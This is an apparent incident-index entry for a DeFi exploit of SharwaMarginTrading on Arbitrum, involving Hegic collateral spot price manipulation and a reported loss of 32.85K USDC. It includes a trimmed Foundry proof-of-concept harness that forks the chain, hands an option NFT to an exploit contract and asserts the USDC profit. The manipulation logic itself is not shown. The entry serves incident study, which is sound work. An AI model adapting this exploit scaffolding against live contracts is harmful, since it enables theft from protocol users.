# [?] SharwaMarginTrading - Hegic collateral spot price manipulation

## Summary
Severity: Unknown
Chain: Arbitrum
Component: SharwaMarginTrading
Published: 2026-05-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/SharwaMarginTrading_exp.sol
Type: defi-exploit-poc

## Details
Lost: 32.85K USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    SharwaMarginTradingExploit private exploit;

    function setUp() public {
        uint256 forkBlock = 458_233_155;
        vm.createSelectFork("arbitrum", forkBlock);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;
        exploit = new SharwaMarginTradingExploit(ATTACKER);

        vm.label(ATTACKER, "Attacker / Profit Receiver");
        vm.label(address(exploit), "Local Attack Receiver");
        vm.label(HEGIC_POSITIONS_MANAGER, "Hegic PositionsManager");
        vm.label(MARGIN_ACCOUNT_MANAGER, "Sharwa MarginAccountManager");
        vm.label(SHARWA_ROUTER, "Sharwa MarginTradingRouter");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 Router");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(USDC_E_TOKEN, "USDC.e");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(WBTC_TOKEN, "WBTC");
    }

    function testExploit() public balanceLog {
        uint256 attackerUsdcBefore = IERC20(USDC_TOKEN).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        IERC721(HEGIC_POSITIONS_MANAGER).safeTransferFrom(ATTACKER, address(exploit), HEGIC_OPTION_ID);

        uint256 profit = IERC20(USDC_TOKEN).balanceOf(ATTACKER) - attackerUsdcBefore;
        assertGt(profit, 32_000_000_000, "USDC profit");
    }
}

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/SharwaMarginTrading_exp.sol_
